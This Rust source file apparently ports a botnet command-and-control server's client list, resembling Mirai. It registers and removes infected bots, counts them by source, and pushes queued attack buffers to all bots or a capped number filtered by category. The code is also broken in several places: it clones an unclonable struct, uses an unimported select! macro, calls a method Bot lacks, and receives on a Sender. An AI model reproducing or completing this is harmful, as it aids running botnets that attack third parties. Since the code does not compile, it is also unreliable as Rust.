use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::sync::mpsc::{self, Receiver, Sender};
use std::thread;
use std::time::Duration;
use rand::Rng;

struct AttackSend {
    buf: Vec<u8>,
    count: i32,
    bot_cata: String,
}

struct ClientList {
    uid: i32,
    count: i32,
    clients: HashMap<i32, Arc<Mutex<Bot>>>,
    add_queue: Sender<Arc<Mutex<Bot>>>,
    del_queue: Sender<Arc<Mutex<Bot>>>,
    atk_queue: Sender<AttackSend>,
    total_count: Sender<i32>,
    cnt_view: Sender<()>,
    cnt_view_recv: Receiver<i32>,
    dist_view_req: Sender<()>,
    dist_view_res: Receiver<HashMap<String, i32>>,
    cnt_mutex: Arc<Mutex<()>>,
}

impl ClientList {
    fn new() -> Self {
        let (add_queue_tx, add_queue_rx) = mpsc::channel();
        let (del_queue_tx, del_queue_rx) = mpsc::channel();
        let (atk_queue_tx, atk_queue_rx) = mpsc::channel();
        let (total_count_tx, total_count_rx) = mpsc::channel();
        let (cnt_view_tx, cnt_view_rx) = mpsc::channel();
        let (dist_view_req_tx, dist_view_req_rx) = mpsc::channel();
        let (dist_view_res_tx, dist_view_res_rx) = mpsc::channel();

        let cnt_mutex = Arc::new(Mutex::new(()));

        let client_list = ClientList {
            uid: 0,
            count: 0,
            clients: HashMap::new(),
            add_queue: add_queue_tx,
            del_queue: del_queue_tx,
            atk_queue: atk_queue_tx,
            total_count: total_count_tx,
            cnt_view: cnt_view_tx,
            cnt_view_recv: cnt_view_rx,
            dist_view_req: dist_view_req_tx,
            dist_view_res: dist_view_res_rx,
            cnt_mutex: cnt_mutex.clone(),
        };

        let cl = client_list.clone();
        thread::spawn(move || cl.worker(add_queue_rx, del_queue_rx, atk_queue_rx));

        let cl = client_list.clone();
        thread::spawn(move || cl.fast_count_worker(total_count_rx, cnt_view_rx));

        client_list
    }

    fn count(&self) -> i32 {
        let _lock = self.cnt_mutex.lock().unwrap();
        self.cnt_view.send(()).unwrap();
        self.cnt_view_recv.recv().unwrap()
    }

    fn distribution(&self) -> HashMap<String, i32> {
        let _lock = self.cnt_mutex.lock().unwrap();
        self.dist_view_req.send(()).unwrap();
        self.dist_view_res.recv().unwrap()
    }

    fn add_client(&self, bot: Arc<Mutex<Bot>>) {
        self.add_queue.send(bot).unwrap();
    }

    fn del_client(&self, bot: Arc<Mutex<Bot>>) {
        self.del_queue.send(bot).unwrap();
        let bot = bot.lock().unwrap();
        println!("Deleted client {} - {} - {}", bot.version, bot.source, bot.conn_remote_addr);
    }

    fn queue_buf(&self, buf: Vec<u8>, max_bots: i32, bot_cata: String) {
        let attack = AttackSend { buf, count: max_bots, bot_cata };
        self.atk_queue.send(attack).unwrap();
    }

    fn fast_count_worker(&self, total_count_rx: Receiver<i32>, cnt_view_rx: Receiver<()>) {
        let mut count = 0;

        loop {
            select! {
                recv(total_count_rx) -> delta => {
                    count += delta.unwrap_or(0);
                },
                recv(cnt_view_rx) -> _ => {
                    self.cnt_view.recv().unwrap(); // Receive view request
                    self.cnt_view.send(count).unwrap(); // Send current count
                }
            }
        }
    }

    fn worker(&self, add_queue: Receiver<Arc<Mutex<Bot>>>, del_queue: Receiver<Arc<Mutex<Bot>>>, atk_queue: Receiver<AttackSend>) {
        let mut rng = rand::thread_rng();
        loop {
            select! {
                recv(add_queue) -> bot => {
                    let bot = bot.unwrap();
                    self.total_count.send(1).unwrap();
                    self.uid += 1;
                    let mut bot = bot.lock().unwrap();
                    bot.uid = self.uid;
                    self.clients.insert(bot.uid, bot.clone());
                },
                recv(del_queue) -> bot => {
                    let bot = bot.unwrap();
                    self.total_count.send(-1).unwrap();
                    self.clients.remove(&bot.lock().unwrap().uid);
                },
                recv(atk_queue) -> attack => {
                    let attack = attack.unwrap();
                    if attack.count == -1 {
                        for (_, bot) in &self.clients {
                            let bot = bot.lock().unwrap();
                            if attack.bot_cata.is_empty() || attack.bot_cata == bot.source {
                                bot.queue_buf(attack.buf.clone());
                            }
                        }
                    } else {
                        let mut count = 0;
                        for (_, bot) in &self.clients {
                            let bot = bot.lock().unwrap();
                            if count > attack.count {
                                break;
                            }
                            if attack.bot_cata.is_empty() || attack.bot_cata == bot.source {
                                bot.queue_buf(attack.buf.clone());
                                count += 1;
                            }
                        }
                    }
                },
                recv(self.cnt_view) -> _ => {
                    self.cnt_view.send(self.count).unwrap();
                },
                recv(self.dist_view_req) -> _ => {
                    let mut res = HashMap::new();
                    for (_, bot) in &self.clients {
                        let bot = bot.lock().unwrap();
                        *res.entry(bot.source.clone()).or_insert(0) += 1;
                    }
                    self.dist_view_res.send(res).unwrap();
                }
            }
        }
    }
}

#[derive(Clone)]
struct Bot {
    uid: i32,
    version: i32,
    source: String,
    conn_remote_addr: String,
}



